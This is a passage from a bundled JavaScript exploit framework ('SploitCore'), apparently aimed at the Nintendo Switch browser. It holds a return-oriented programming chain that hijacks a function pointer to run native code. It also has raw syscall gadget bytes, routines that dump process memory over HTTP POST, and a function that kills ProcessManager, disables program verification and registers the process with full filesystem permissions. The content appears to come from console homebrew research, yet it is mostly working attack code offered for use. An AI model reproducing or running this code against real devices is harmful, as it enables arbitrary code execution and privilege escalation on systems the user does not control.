	this.write8(load_and_str_x8, sp, (0x0E0 + 0x18) >> 2);             // Load LR with Load, STR X8
	this.write8(utils.add2(dumparea, 0x318 - 0x18), sp, (0x100 + 0x8) >> 2); // Load X19 = dumparea + 0x318 - 0x18
	this.write8(mov_x2_into_x1, sp, (0x100 + 0x18) >> 2);              // Load LR with mov x1, x2
	this.write8(utils.add2(dumparea, 0x3F8), sp, (0x120 + 0x0) >> 2);        // Load X20 with scratch space
	this.write8(utils.add2(dumparea, 0x320), sp, (0x120 + 0x8) >> 2);        // Load X19 = dumparea + 0x320
	this.write8(str_x0, sp, (0x120 + 0x18) >> 2);                      // Load LR with str x0
	this.write8(utils.add2(dumparea, 0x388), sp, (0x140 + 0x0) >> 2);        // Load X19 = dumparea + 0x388
	this.write8(utils.add2(dumparea, 0x320), dumparea, 0x388 >> 2);          // Write dumparea + 0x320 to dumparea + 0x388
	this.write8(load_and_str_x8, sp, (0x140 + 0x18) >> 2);             // Load LR with load, STR X8
	this.write8(utils.add2(dumparea, 0x3F8), sp, (0x160 + 0x0) >> 2);        // Load X20 with scratch space
	this.write8(utils.add2(dumparea, 0x328 - 0x58), sp, (0x160 + 0x8) >> 2); // Load X19 = dumparea + 0x328 - 0x58
	this.write8(str_x9, sp, (0x160 + 0x18) >> 2);                      // Load LR with STR X9
	this.write8(utils.add2(dumparea, 0x390), sp, (0x180 + 0x0) >> 2);        // Load X19 with dumparea + 0x390
	this.write8(block_struct_3, dumparea, 0x390 >> 2);                 // Write block struct 3 to dumparea + 0x390
	this.write8(load_and_str_x8, sp, (0x180 + 0x18) >> 2);             // Load LR with load, STR X8
	this.write8(load_x0_w1_x2_x9_blr_x9, sp, (0x1A0 + 0x18) >> 2);     // Load LR with gadget 2

	// Block Struct 3
	this.write8(dumparea, block_struct_3, 0x00 >> 2);
	this.write8(load_x30_from_sp_br_x2, block_struct_3, 0x10 >> 2);
	this.write8(savegadg, block_struct_3, 0x38 >> 2);

	this.write8(utils.add2(str_x20, 0x4), sp, (0x1C0 + 0x28) >> 2);          // Load LR with LD X19, X20, X30
	this.write8(utils.add2(savearea, 0xF8), sp, (0x1F0 + 0x0) >> 2);         // Load X20 with savearea + 0xF8 (saved SP)
	this.write8(utils.add2(dumparea, 0x398), sp, (0x1F0 + 0x8) >> 2);     // Load X19 with dumparea + 0x398
	this.write8(base_sp, dumparea, 0x398 >> 2);                           // Write SP to dumparea + 0x38
	this.write8(load_and_str_x8, sp, (0x1F0 + 0x18) >> 2);                   // Load X30 with LD, STR X8
	this.write8(utils.add2(savearea, 0x100), sp, (0x210 + 0x0) >> 2);        // Load X20 with savearea + 0x100 (saved LR)
	this.write8(utils.add2(dumparea, 0x3A0), sp, (0x210 + 0x8) >> 2);     // Load X19 with dumparea + 0x3A0
	this.write8(returngadg, dumparea, 0x3A0 >> 2);                        // Write return gadget to dumparea + 0x3A0
	this.write8(load_and_str_x8, sp, (0x210 + 0x18) >> 2);                   // Load X30 with LD, STR X8
	this.write8(utils.add2(savearea, 0xC0), sp, (0x230 + 0x0) >> 2);         // Load X20 with savearea + 0xC0 (saved X24)
	this.write8(utils.add2(dumparea, 0x3A8), sp, (0x230 + 0x8) >> 2);     // Load X19 with dumparea + 0x3A8
	this.write8([0x00000000, 0xffff0000], dumparea, 0x3A8 >> 2);          // Write return gadget to dumparea + 0x3A8
	this.write8(load_and_str_x8, sp, (0x230 + 0x18) >> 2);                   // Load X30 with LD, STR X8
	this.write8(savearea, sp, (0x250 + 0x8) >> 2);                           // Load X19 with savearea
	this.write8(mov_x19_into_x0, sp, (0x250 + 0x18) >> 2);                   // Load X30 with mov x0, x19.
	this.write8(loadgadg, sp, (0x270 + 0x18) >> 2);                          // Load X30 with context load

	utils.dlog('Assigning function pointer');

	var funcaddr = this.getFuncAddr();
	utils.dlog('Function object at ' + utils.paddr(funcaddr));
	var curptr = this.read8(funcaddr, 8);
	this.write8(jaddr, funcaddr, 8);
	utils.dlog('Patched function address from ' + utils.paddr(curptr) + ' to ' + utils.paddr(this.read8(funcaddr, 8)));
	utils.dlog('Jumping.');
	this.func.apply(0x100, [0, 0, 0, 0, 0, 0, 0, 0, carr, 0, 0, 0, 0, 0, 0, 0, 0]);
	utils.dlog('Jumped back.');

	this.write8(curptr, funcaddr, 8);
	utils.dlog('Restored original function pointer.');

	var ret = this.read8(dumparea, 0x320 >> 2);

	if (dump_regs) {
		utils.log('Register dump post-code execution:');
		for (var i = 0; i <= 30; i++) {
			if (i === 0) {
				utils.log('X0: ' + utils.paddr(this.read8(dumparea, 0x320 >> 2)));
			} else if (i === 1) {
				utils.log('X1: ' + utils.paddr(this.read8(dumparea, 0x310 >> 2)));
			} else if (i === 2) {
				utils.log('X2: ' + utils.paddr(this.read8(dumparea, 0x318 >> 2)));
			} else if (i === 8) {
				utils.log('X8: ' + utils.paddr(this.read8(dumparea, 0x308 >> 2)));
			} else if (i === 9) {
				utils.log('X9: ' + utils.paddr(this.read8(dumparea, 0x328 >> 2)));
			} else if (i === 20) {
				utils.log('X20: ' + utils.paddr(this.read8(dumparea, 0x300 >> 2)));
			} else if (i === 16 || i === 19 || i === 29 || i === 30) {
				utils.log('X' + i + ': Not dumpable.');
			} else {
				utils.log('X' + i + ': ' + utils.paddr(this.read8(dumparea, (8 * i) >> 2)));
			}
		}
	}

	utils.dlog('Native code at ' + utils.paddr(funcptr) + ' returned: ' + utils.paddr(ret));

	this.free(context_load_struct);
	this.free(block_struct_0);
	this.free(block_struct_1);
	this.free(block_struct_2);
	this.free(block_struct_3);
	this.free(savearea);
	this.free(loadarea);
	this.free(dumparea);

	utils.dlog('Freed all buffers');

	utils.dlog('Forcing garbage collection...');
	this.gc();
	utils.dlog('Collected garbage!');

	return ret;
};

/**
	Call a specific svc with arguments
	@param {number} id - ID of the SVC
	@param {Array.<any>} args - Arguments to pass
	@param {boolean} dump_regs - Dump registers
 */
SploitCore.prototype.svc = function (id, args, dump_regs) {
	var svc_list = {
		0x01: [0xE0, 0x0F, 0x1F, 0xF8, 0x21, 0x00, 0x00, 0xD4],
		0x02: [0x41, 0x00, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6],
		0x03: [0x61, 0x00, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6],
		0x04: [0x81, 0x00, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6],
		0x05: [0xA1, 0x00, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6],
		0x06: [0xE1, 0x0F, 0x1F, 0xF8, 0xC1, 0x00, 0x00, 0xD4],
		0x07: [0xE1, 0x00, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6],
		0x08: [0xE0, 0x0F, 0x1F, 0xF8, 0x01, 0x01, 0x00, 0xD4],
		0x09: [0x21, 0x01, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6],
		0x0A: [0x41, 0x01, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6],
		0x0B: [0x61, 0x01, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6],
		0x0C: [0xE0, 0x0F, 0x1F, 0xF8, 0x81, 0x01, 0x00, 0xD4],
		0x0D: [0xA1, 0x01, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6],
		0x0E: [0xE0, 0x07, 0xBF, 0xA9, 0xC1, 0x01, 0x00, 0xD4],
		0x0F: [0xE1, 0x01, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6],
		0x10: [0x01, 0x02, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6],
		0x11: [0x21, 0x02, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6],
		0x12: [0x41, 0x02, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6],
		0x13: [0x61, 0x02, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6],
		0x14: [0x81, 0x02, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6],
		0x15: [0xE0, 0x0F, 0x1F, 0xF8, 0xA1, 0x02, 0x00, 0xD4],
		0x16: [0xC1, 0x02, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6],
		0x17: [0xE1, 0x02, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6],
		0x18: [0xE0, 0x0F, 0x1F, 0xF8, 0x01, 0x03, 0x00, 0xD4],
		0x19: [0x21, 0x03, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6],
		0x1A: [0x41, 0x03, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6],
		0x1B: [0x61, 0x03, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6],
		0x1C: [0x81, 0x03, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6],
		0x1D: [0xA1, 0x03, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6],
		// 0x1E: ,
		0x1F: [0xE0, 0x0F, 0x1F, 0xF8, 0xE1, 0x03, 0x00, 0xD4],
		// 0x20: ,
		0x21: [0x21, 0x04, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6],
		0x22: [0x41, 0x04, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6],
		// 0x23: 0x,
		// 0x24: 0x,
		0x25: [0xE0, 0x0F, 0x1F, 0xF8, 0xA1, 0x04, 0x00, 0xD4],
		0x26: [0xC1, 0x04, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6],
		0x27: [0xE1, 0x04, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6],
		0x28: [0x01, 0x05, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6],
		0x29: [0xE0, 0x0F, 0x1F, 0xF8, 0x21, 0x05, 0x00, 0xD4],
		// 0x2A-0x2B
		0x2C: [0x81, 0x05, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6],
		0x2D: [0xA1, 0x05, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6],
		// 0x2E-0x4F
		0x50: [0xE0, 0x0F, 0x1F, 0xF8, 0x01, 0x0A, 0x00, 0xD4],
		0x51: [0x21, 0x0A, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6],
		0x52: [0x41, 0x0A, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6]
	};

	if (!(id in svc_list)) {
		throw new Error('Failed to call svc 0x' + id.toString(16) + '.');
	}

	return this.call(this.gadget(svc_list[id]), args, [], [], dump_regs);
};

/**
	TODO DOCS
 */
SploitCore.prototype.getTLS = function () {
	return this.call(this.gadget([0x60, 0xd0, 0x3b, 0xd5, 0xc0, 0x03, 0x5f, 0xd6]), []);
};

/**
	TODO DOCS
 */
SploitCore.prototype.str2buf = function (inp) {
	var len = inp.length + 1;
	var v = this.malloc(len);
	this.memview(v, len, function (view) {
		var u8b = new Uint8Array(view);
		for (var j = 0; j < len; ++j) { u8b[j] = inp.charCodeAt(j); }
		u8b[inp.length] = 0;
	});

	return v;
};

/**
	Initiate a memory dump over HTTP
	@param {u64} offset - Memory address to start from 
	@param {number} size - Number of bytes you wish to dump
	@param {string} fileName - Name of file, used to set Content-Disposition
 */
SploitCore.prototype.memdump = function (offset, size, fileName) {
	if(ArrayBuffer.isView(offset) || offset instanceof ArrayBuffer) {
		offset = this.getArrayBufferAddr(offset);
	}
	var totalSize = utils.trunc32(size);
	var idx = 0;

	utils.dlog('Dumping memory!');
	for (var idx = 0; idx < totalSize; idx += 0x800000) {
		size = totalSize - idx;
		size = size > 0x800000 ? 0x800000 : size;

		this.memview(utils.add2(offset, idx), size, function (ab) {
			var view = new Uint8Array(ab);
			var xhr = new XMLHttpRequest();
			xhr.open('POST', '/filedump', false);
			xhr.setRequestHeader('Content-Type', 'application/octet-stream');
			xhr.setRequestHeader('Content-Disposition', fileName);
			xhr.send(view);
		});
	}
	utils.dlog('Dumped memory succesfully!');
};

/**
	Forces the garbage collector to run
 */
SploitCore.prototype.gc = function () {
	utils.dlog('Beginning GC force');
	function sub (depth) {
		utils.dlog('GC force ' + depth);
		if (depth > 0) {
			var arr = [];
			utils.dlog('Building...');
			for (var i = 0; i < 10; ++i) {
				arr.push(new Uint8Array(0x40000));
			}
			utils.dlog('Shifting...');
			while (arr.length > 0) {
				arr.shift();
			}
			sub(depth - 1);
		}
	}
	sub(20);
	utils.dlog('GC should be solid');
};

/**
	Reads a string from memory
	@param {u64} addr - Address to start from
	@param {number} length - Number of bytes to read
	@returns {string}
 */
SploitCore.prototype.readString = function (addr, length) {
	if (arguments.length === 1) {
		length = -1;
	}

	return this.memview(addr, 0xFFFFFFFF, function (view) {
		var u8b = new Uint8Array(view);
		var out = '';

		for (var i = 0; (length === -1 && u8b[i] !== 0) || (length !== -1 && i < length); i++) {
			out += String.fromCharCode(u8b[i]);
		}

		return out;
	});
};

SploitCore.prototype.enableTurbo = function() {
	this.turbo = true;
	if(!this.altcaller) {
		this.altcaller = new AltCaller(this);
	}
};

SploitCore.prototype.disableTurbo = function() {
	this.turbo = false;
}

/**
	Copy memory from one region to another
	@param {u64} dst - Base destination address
	@param {u64} src - Base source address
	@param {number} size - Number of bytes to copy
 */
SploitCore.prototype.memcpy = function (dst, src, size) {
	this.call(this.gadget('eb0301cb690940923f0102eb62020054c90200b4e80301aaea0300aa'), [dst, src, size]);
};

/**
	Kills ProcessManager so that handles to
	fsp-pr can be obtained.
 */
SploitCore.prototype.getFSPPR = function() {
	if(this.has_fsppr !== undefined) {
		return;
	}
	this.enableTurbo();
	var sc = this;
	var func = (r, m, c) => {
		return sc.getService("fsp-pr").map((srv) => {
			sc.has_fsppr = true;
			sc.svcCloseHandle(srv).assertOk();
		}, (err) => {
			return sc.getFSPPR();
		});
	};
	return this.ipcMsg(2).setType(5).sendTo("pm:shell").withHandles(func, func);
}

/**
	Gets the current PID
 */
SploitCore.prototype.getPid = function() {
	var sc = this;
	return this.getService("fsp-srv", (tmp_hnd) => {
		sc.ipcMsg(1).sendPid().data(0).sendTo(tmp_hnd).assertOk();
		return sc.ipcBuf[0xC >> 2]; // server side doesn't clear this field when sending the response
	});
}

SploitCore.prototype.escalateFilesystemPrivileges = function(tid) {
	this.getFSPPR();

	if(tid === undefined) {
		tid = 0;
	}
	if(typeof(tid) === "string") {
		tid = utils.parseAddr(tid);
	}
	
	var pid = this.getPid();

	var buf1 = new Uint32Array([
		1,
		0xffffffff, 0xffffffff, // this is the permissions value
		0x1c, 0,
		0x1c, 0
	]);
	var buf2 = new Uint32Array([
		1,
		0xffffffff, 0xffffffff,
		0, 0,
		0xffffffff, 0xffffffff,
		0, 0,
		0xffffffff, 0xffffffff,
	]);

	var sc = this;
	this.getService("fsp-pr", (fsppr) => {
		sc.ipcMsg(256).datau32(0).sendTo(fsppr).assertOk(); // SetEnabledProgramVerification
		sc.ipcMsg(1).datau64(pid).sendTo(fsppr).assertOk(); // UnregisterProgram
		sc.ipcMsg(0).data(2, utils.pad64(pid), utils.pad64(tid), buf1.byteLength, buf2.byteLength, pid, pid, 0, 0, 0, 0, 0)
			.aDescriptor(buf1)
			.aDescriptor(buf2)
			.sendTo(fsppr)
			.assertOk(); // RegisterProgram
	});
}

/*
	Writes to a file on the given filesystem.
	FS is IFileSystem to write to, path is where to write,
	is_exfat will prevent the file from being split into 2 GiB segments,
	size is the total size of the data to dump, and reader has signature
	reader(targetArrayBuffer, offset, size) and should return a Result.
 */
SploitCore.prototype.dumpToFile = function(fs, path, is_exfat, size, reader) {
	if(is_exfat === undefined) {
		is_exfat = false;
	}

	var two_gigs = 0x80000000 >>> 0;
	var out_buf = new ArrayBuffer(0x1000000);

	var out_path = path;
	if((size[1] > 0 || size[0] > two_gigs) && !is_exfat) {
		out_path = path + ".0";
		fs.CreateFile(out_path, two_gigs).mapErr((e) => { if(e.resultCode != 0x402) { throw new Error(e); } }); // 0x402 (file already exists) is not a hard failure
	} else {
		fs.CreateFile(out_path, size).mapErr((e) => { if(e.resultCode != 0x402) { throw new Error(e); } });
	}

	var file = fs.OpenFile(out_path).assertOk();

	var offset = [0, 0];
	var offset_in_file = 0;
	var file_num = 0;

	while(offset[0] < size[0] || offset[1] < size[1]) {
		var block_size = out_buf.byteLength;
		if(offset[1] == size[1] && size[0] < offset[0] + out_buf.byteLength) {
			block_size = size[0] - offset[0];
		}

		reader(out_buf, offset, block_size).assertOk();
		file.Write(offset_in_file, out_buf, block_size).assertOk();

		offset = utils.add2(offset, block_size);
		utils.log("Dumped: " + utils.paddr(offset) + " / " + utils.paddr(size));

		offset_in_file+= block_size;
		if(offset_in_file >= two_gigs && !is_exfat) {
			file.Flush().assertOk();
			this.svcCloseHandle(file.handle).assertOk();
			file_num++;
			var new_path = path + "." + file_num;
			if(size[1] > offset[1] || size[0] > two_gigs + offset[0]) {
				fs.CreateFile(new_path, two_gigs).assertOk();
			} else {
				fs.CreateFile(new_path, size[0] - offset[0]).assertOk();
			}
			file = fs.OpenFile(new_path).assertOk();
			offset_in_file = 0;
		}
	}
	file.Flush().assertOk();
	this.svcCloseHandle(file.handle).assertOk();
};

SploitCore.prototype.IFile = IFile;
SploitCore.prototype.IFileSystem = IFileSystem;
SploitCore.prototype.IDirectory = IDirectory;
SploitCore.prototype.IStorage = IStorage;

module.exports = SploitCore;

},{"../config":1,"./AltCaller":2,"./AsyncCaller":3,"./fs/IDirectory":6,"./fs/IFile":7,"./fs/IFileSystem":8,"./fs/IStorage":9,"./nvcore":14,"./sdbcore":16,"./sploitMixin":17,"./svc":19,"./utils":20}],19:[function(require,module,exports){
var Result = require('./Result');
var ResultCode = require('./ResultCode');
var utils = require('./utils');

var svcMixin = {};
svcMixin.svcWithResult = function (id, args, dumpRegs) {
	var ret = this.svc(id, args, dumpRegs);
	if (ret[0] !== 0 || ret[1] !== 0) {
		return new Result.Err(new ResultCode(ret));
	} else {
		return Result.NullOk;
	}
};

/*
  Usages:
  svcCreateTransferMemory(size)
  svcCreateTransferMemory(arrayBuffer)
  svcCreateTransferMemory(address, size)
  svcCreateTransferMemory(arrayBuffer, permission)
  svcCreateTransferMemory(address, size, permission)
*/
svcMixin.svcCreateTransferMemory = function () {
	var address;
	var size;
	var permission = 0;
	switch (arguments.length) {
	case 0:
		throw new Error('expected at least one argument');
	case 1:
		if (Array.isArray(arguments[0]) || typeof (arguments[0]) === 'number') {
			size = arguments[0];
			break;
		}
		if (arguments[0] instanceof ArrayBuffer) {
			if (!this.isBrowser) {
				throw new Error("don't try to make transfer memory with ArrayBuffers if you're not the browser please");
			}
			address = this.getArrayBufferAddr(arguments[0]);
			size = [arguments[0].byteLength, 0];
			break;
		}
		throw new Error('invalid usage, single argument is expected to be a size, typed array, or ArrayBuffer');
	case 2:
		if (Array.isArray(arguments[0])) {
			address = arguments[0];
			size = arguments[1];
			break;
		}
		if (arguments[0] instanceof ArrayBuffer) {
			if (!this.isBrowser) {
				throw new Error("don't try to make transfer memory with ArrayBuffers if you're not the browser please");
			}
			address = this.getArrayBufferAddr(arguments[0]);
			size = arguments[0].byteLength;
			permission = arguments[1];
			break;
		}
		throw new Error('invalid usage, expected (address, size) or (arrayBuffer, permission)');
	case 3:
		address = arguments[0];
		size = arguments[1];
		permission = arguments[2];
		break;
	default:
		throw new Error('invalid usage');
	}
	if (address === undefined) {
		address = this.malloc(size);
	}

	address = utils.pad64(address);
	size = utils.pad64(size);
	permission = utils.pad64(permission);

	var handleBuffer = new Uint32Array(2);
	return this.svcWithResult(0x15, [handleBuffer, address, size, permission]).replaceValue(handleBuffer[0]);
};

/*
  Usages:
  svcCreateSharedMemory(size)
  svcCreateSharedMemory(size, permission)
  svcCreateSharedMemory(size, permission1, permission2)
*/
svcMixin.svcCreateSharedMemory = function (size, permission1, permission2) {
	if (permission1 === undefined) {
		permission1 = 3; // RW
	}
	if (permission2 === undefined) {
		permission2 = permission1;
	}

	if (typeof (size) === 'number') { size = [size, 0]; }
	if (typeof (permission1) === 'number') { permission1 = [permission1, 0]; }
	if (typeof (permission2) === 'number') { permission2 = [permission2, 0]; }

	if (!Array.isArray(size)) { throw new Error('invalid size type'); }
	if (!Array.isArray(permission1)) { throw new Error('invalid permission1 type'); }
	if (!Array.isArray(permission2)) { throw new Error('invalid permission2 type'); }

	var handleBuffer = new Uint32Array(2);
	return this.svcWithResult(0x50, [handleBuffer, size, permission1, permission2]).replaceValue(handleBuffer[0]);
};

/*
  Usages:
  svcMapSharedMemory(handle, size)
  svcMapSharedMemory(handle, size, perm)
  svcMapSharedMemory(handle, addr, size, perm)

  Returns:
  Mapped address
 */
svcMixin.svcMapSharedMemory = function (handle) {
	var size;
	var addr;
	var perm = 3;
	switch (arguments.length) {
	case 3:
		perm = arguments[2];
		// fallthrough
	case 2:
		size = arguments[1];
		addr = this.findUnmappedRegion(size);
		break;
	case 4:
		addr = arguments[1];
		size = arguments[2];
		perm = arguments[3];
		break;
	default:
		throw new Error('invalid usage');
	}

	return this.svcWithResult(0x13, [handle, addr, size, perm]).replaceValue(addr);
};

/*
  Usages:
  svcMapTransferMemory(handle, size)
  svcMapTransferMemory(handle, size, perm)
  svcMapTransferMemory(handle, addr, size, perm)

  Returns:
  Mapped address
 */
svcMixin.svcMapTransferMemory = function (handle) {
	var size;
	var addr;
	var perm = 3;
	switch (arguments.length) {
	case 3:
		perm = arguments[2];
		// fallthrough
	case 2:
		size = arguments[1];
		addr = this.findUnmappedRegion(size);
		break;
	case 4:
		addr = arguments[1];
		size = arguments[2];
		perm = arguments[3];
		break;
	default:
		throw new Error('invalid usage');
	}

	return this.svcWithResult(0x51, [handle, addr, size, perm]).replaceValue(addr);
};

svcMixin.svcUnmapTransferMemory = function (handle, addr, size) {
	return this.svcWithResult(0x52, [handle, addr, size]);
};

svcMixin.svcGetSystemTick = function () {
	var info = new Uint32Array(2);
	return this.svcWithResult(0x29, [info, 10, 0, [0xFFFFFFFF, 0xFFFFFFFF]]).replaceValue([info[0], info[1]]); // GetSystemTick
};

svcMixin.svcQueryMem = function (addr, raw) {
	if (arguments.length === 1) { raw = false; }

	var meminfo = new Uint32Array(12);
	var pageinfo = new Uint32Array(2);

	var memperms = ['NONE', 'R', 'W', 'RW', 'X', 'RX', 'WX', 'RWX'];
	var memstates = ['NONE', 'IO', 'NORMAL', 'CODE-STATIC', 'CODE', 'HEAP', 'SHARED-MEM', 'WEIRD-SHARED-MEM', 'MODULE-CODE-STATIC', 'MODULE-CODE', 'IPC-BUF-0', 'MEM-MAP', 'THREAD-LOCAL-STORAGE', 'TRANSFER-MEMORY-ISOLATED', 'TRANSFER-MEMORY', 'PROCESS-MEMORY', 'RESERVED', 'IPC-BUF-1', 'IPC-BUF-3', 'KERN-STACK'];
	return this.svcWithResult(0x6, [meminfo, pageinfo, addr]).map(() => {
		var ms = meminfo[4];
		if (!raw && ms < memstates.length) { ms = memstates[ms]; } else if (!raw) { ms = 'UNKNOWN'; }
		var mp = meminfo[6];
		if (!raw && mp < memperms.length) { mp = memperms[mp]; }
    
		return [[meminfo[0], meminfo[1]], [meminfo[2], meminfo[3]], ms, mp, [pageinfo[0], pageinfo[1]]];
	});
};

svcMixin.svcCloseHandle = function (handle) {
	return this.svcWithResult(0x16, [handle]);
};

svcMixin.svcConnectToPort = function (portName) {
	var handleBuffer = new Uint32Array(2);
	var ret = this.svcWithResult(0x1F, [handleBuffer, utils.str2ab(portName)]).replaceValue([handleBuffer[0], handleBuffer[1]]);
	return ret;
};

svcMixin.svcSendSyncRequestWithUserBuffer = function (addr, size, handle) {
	return this.svcWithResult(0x22, [addr, size, handle]);
};

svcMixin.svcCreateThread = function (entry, arg, stacktop, prio, processorId) {
	var handleBuffer = new Uint32Array(2);
	return this.svcWithResult(0x8, [handleBuffer, entry, arg, stacktop, prio, processorId]).replaceValue([handleBuffer[0], handleBuffer[1]]);
};

svcMixin.svcStartThread = function (handle) {
	return this.svcWithResult(0x9, [handle]);
};

svcMixin.svcAcceptSession = function (port) {
	var handleBuffer = new Uint32Array(2);
	return this.svcWithResult(0x41, [handleBuffer, port]).replaceValue(handleBuffer[0]);
};

svcMixin.svcReplyAndReceiveWithUserBuffer = function (buf, handles, reply, timeout) {
	var handleIdxBuffer = new Uint32Array(2);
	return this.svcWithResult(0x44, [handleIdxBuffer, buf, buf.byteLength, handles ? new Uint32Array(handles) : 0, handles ? handles.length : 0, reply, timeout]).replaceValue(handleIdxBuffer[0]);
};

svcMixin.svcWaitSynchronization = function (handles, timeout) {
	var handlesBuffer = new Uint32Array(handles);
	var handleIdxBuffer = new Uint32Array(1);
	return this.svcWithResult(0x18, [handleIdxBuffer, handlesBuffer, handlesBuffer.length, timeout]).replaceValue(handleIdxBuffer[0]);
}

module.exports = svcMixin;

},{"./Result":4,"./ResultCode":5,"./utils":20}],20:[function(require,module,exports){
/* eslint no-global-assign: "off" */
/* global XMLHttpRequest */
var config = require('../config');

var DEBUG = false;

var utils = exports;

exports.paddr = function paddr (lo, hi) {
	if (arguments.length === 1) {
		hi = lo[1];
		lo = lo[0];
	}
	var slo = ('00000000' + lo.toString(16)).slice(-8);
	var shi = ('00000000' + hi.toString(16)).slice(-8);
	return '0x' + shi + slo;
};

exports.parseAddr = function parseAddr (addr) {
	addr = "0000000000000000" + addr.replace('0x', '');
	addr = addr.slice(addr.length - 16);
	var arr = [addr.slice(0, 8), addr.slice(8, 16)];
	var hi = parseInt(arr[0], 16);
	var lo = parseInt(arr[1], 16);
	return [ lo, hi ];
};

exports.nullptr = function nullptr (addr) {
	return addr[0] === 0 && addr[1] === 0;
};

exports.eq = function eq (a, b) {
	return a[0] === b[0] && a[1] === b[1];
};

exports.add2 = function add2 (addr, off) {
	if (typeof off === 'number') {
		if (off >= 0) {
			off = [off, 0];
		} else {
			off = [(0xFFFFFFFF + off + 1) >>> 0, 0xFFFFFFFF];
		}
	}

	var alo = addr[0];
	var ahi = addr[1];
	var blo = off[0];
	var bhi = off[1];

	var nlo = ((alo + blo) & 0xFFFFFFFF) >>> 0;
	var nhi = ((ahi + bhi) & 0xFFFFFFFF) >>> 0;

	if ((nlo < alo && blo > 0) || (nlo === alo && blo !== 0)) {
		nhi = ((nhi + 1) & 0xFFFFFFFF) >>> 0;
	} else if (nlo > alo && blo < 0) {
		nhi = ((nhi - 1) & 0xFFFFFFFF) >>> 0;
	}

	return [nlo, nhi];
};

exports.sub2 = function sub2 (addr, off) {
	if (typeof off === 'number') {
		if (off >= 0) {
			off = [off, 0];
		} else {
			off = [(0xFFFFFFFF + off + 1) >>> 0, 0xFFFFFFFF];
		}
	}

	off = exports.add2([off[0] ^ 0xFFFFFFFF, off[1] ^ 0xFFFFFFFF], 1);
	return exports.add2(addr, off);
};

exports.send = function send (ep, data) {
	var msg = {
		msg: data
	};
	var jsonstr = JSON.stringify(msg);
	try {
		var xhr = new XMLHttpRequest();
		xhr.open('POST', '/' + ep, false);
		xhr.setRequestHeader('Content-Type', 'application/json');
		xhr.send(jsonstr);
	} catch (e) {

	}
};

exports.pushCache = function pushCache (cache) {
	exports.send('cache', cache);
};

exports.dlog = function dlog (msg) {
	if (DEBUG) {
		log(msg);
	}
};

exports.toHex = function (d) {
	return d.toString(16);
};

/*
  example:
  utils.packBitfield([
    {targetBegin: 16, size: 4},
    {targetBegin: 20, targetEnd: 24},
    {targetBegin: 24, size: 4, sourceBegin: 2}], [5, 6, 7])
 */
exports.packBitfield = function (spec, values) {
	var bitfield = 0;
	if(spec.length !== values.length) {
		throw "bitfield spec doesn't match number of provided values";
	}
	for(var i = 0; i < spec.length; i++) {
		var s = spec[i];
		var v = values[i];
    
		var tb = s.targetBegin;
		var te;
		var sb = s.sourceBegin === undefined ? 0 : s.sourceBegin;
		var se;
		var size;
		if(s.targetEnd && !s.size && !s.sourceEnd) {
			te = s.targetEnd;
			size = s.targetEnd - tb;
			se = sb + size;
		} else if(s.size && !s.targetEnd && !s.sourceEnd) {
			te = s.targetBegin + s.size;
			se = sb + s.size;
			size = s.size;
		} else if(s.sourceEnd && !s.size && !s.targetEnd) {
			se = s.sourceEnd;
			size = s.sourceEnd - sb;
			te = s.tb + size;
		} else if(s.targetEnd - tb === s.sourceEnd - sb) {
			size = s.targetEnd - tb;
			if(s.size && s.size !== size) {
				throw "size does not match";
			}
		} else {
			throw "bitfield spec number " + i + " needs one of targetEnd, size, or sourceEnd";
		}

		bitfield = bitfield | (((v >> sb) & ((1<<size)-1)) << tb);
	}

	return bitfield;
};

exports.unpackBitfield = function (spec, bitfield) {
	return spec.map((s) => {
		var tb = s.targetBegin;
		var te;
		var sb = s.sourceBegin === undefined ? 0 : s.sourceBegin;
		var se;
		var size;
		if(s.targetEnd && !s.size && !s.sourceEnd) {
			te = s.targetEnd;
			size = s.targetEnd - tb;
			se = sb + size;
		} else if(s.size && !s.targetEnd && !s.sourceEnd) {
			te = s.targetBegin + s.size;
			se = sb + s.size;
			size = s.size;
		} else if(s.sourceEnd && !s.size && !s.targetEnd) {
			se = s.sourceEnd;
			size = s.sourceEnd - sb;
			te = s.tb + size;
		} else if(s.targetEnd - tb === s.sourceEnd - sb) {
			size = s.targetEnd - tb;
			if(s.size && s.size !== size) {
				throw "size does not match";
			}
		} else {
			throw "bitfield spec number " + i + " needs one of targetEnd, size, or sourceEnd";
		}

		return ((bitfield >> tb) & ((1<<size)-1)) << sb;
	});
};

exports.assertu32 = function (num) {
	if(!Number.isInteger(num)) {
		throw new Error("expected integer");
	}
	if(num > 0xFFFFFFFF) {
		throw new Error("too large for u32");
	}
	if(num < 0) {
		throw new Error("expected positive integer");
	}
	return num;
};

exports.assertu64 = function (arr) {
	if(!Array.isArray(arr)) {
		throw new Error("expected array");
	}
	if(arr.length !== 2) {
		throw new Error("expected [lo, hi] pair");
	}
